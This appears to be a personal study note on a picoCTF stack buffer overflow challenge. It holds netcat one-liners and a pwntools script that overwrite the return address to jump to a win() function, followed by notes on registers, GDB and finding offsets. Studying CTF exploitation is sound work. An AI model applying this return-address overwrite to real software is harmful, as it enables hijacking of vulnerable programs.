(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"\xb6\x84\x1\x40")') | nc mysterious-sea.picoctf.net 57579
(python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*40 + pack("<Q", 0x401256))') | nc mysterious-sea.picoctf.net 57579

```python
from pwn import *

# 1. Set the target (local or remote)
io = remote('mysterious-sea.picoctf.net', 57579)

# 2. Define the payload
offset = 40
win_addr = 0x401256

# p64() automatically handles "Little Endian" and 64-bit conversion
payload = b"A" * offset + p64(win_addr)
# payload = b"A" * offset + b"\x56\x12\x40\x00\x00\x00\x00\x00"

# 3. Send and receive
io.sendlineafter(b"Please enter your name: ", payload)

# 4. Get the flag
print(io.recvall().decode())
```

# PWN | Intro
pwntools（Python 漏洞利用框架）
GDB + pwndbg / GEF
ROPgadget / ropper
one_gadget
checksec



# RBP
Saved Fream Pointer (RBP)

# Cover Return Address
- `python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*40 + pack("<Q", 0x401256))' | ./vuln`

#
nm TAREGET

# Registers
on a 64-bit system, notice the names start with R (RIP, RSP). In 32-bit systems, they start with E (EIP, ESP).
*   **RIP (Instruction Pointer):**
    *   **Role:** Points to the very next instruction the CPU will execute. 
    *   **Pwn Goal:** This is the "Holy Grail." You overwrite the Return Address on the stack so that when a function ends, the CPU loads your value into **RIP**, jumping to `win()`.
*   **RSP (Stack Pointer):**
    *   **Role:** Points to the very **top** of the current stack.
    *   **Pwn Goal:** Useful for "stack pivoting" or seeing if your payload is being truncated. If you see your "A"s at the address RSP points to, you've landed on the stack.
*   **RBP (Base Pointer):**
    *   **Role:** Points to the **bottom** of the current function's local storage.
    *   **Pwn Goal:** As you discovered, this is your "anchor." Finding when you overwrite RBP is the easiest way to calculate the distance to RIP.




# Offset | Pattern command

# GDB
- `info address TARGET`
- `info registers`
- `disassemble TARGET`
- `info frame`
- `x/gx $rsp`: Examine the 8 bytes (g = giant) at the top of the stack in hex (x).
- `p $rip`: Print the current instruction pointer address.

**pattern create**

- `run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*36 + b"B"*36 + b"C"*36 + b"D"*36)')`
## Find Return Address
Since we can't use pattern create, let's use a simple trick. We know the buffer is 32 bytes. On 64-bit systems, there is usually an 8-byte "Saved Base Pointer" (RBP) sitting right after your buffer and right before the "Return Address."

Find the Offset: Determine exactly how many bytes are between the start of buf and the Return Address. (Usually 32 bytes for the buffer + some padding for the base pointer, often totaling 40 or 44 bytes on 64-bit systems).

Memory Addresses are 64-bit: You must use p64() in Python (8 bytes) instead of p32().

The Offset: On 64-bit systems, the stack often aligns to 16 bytes. While your buffer is 32 bytes, the distance to the return address is likely 40 bytes (32 for the buffer + 8 for the saved Base Pointer).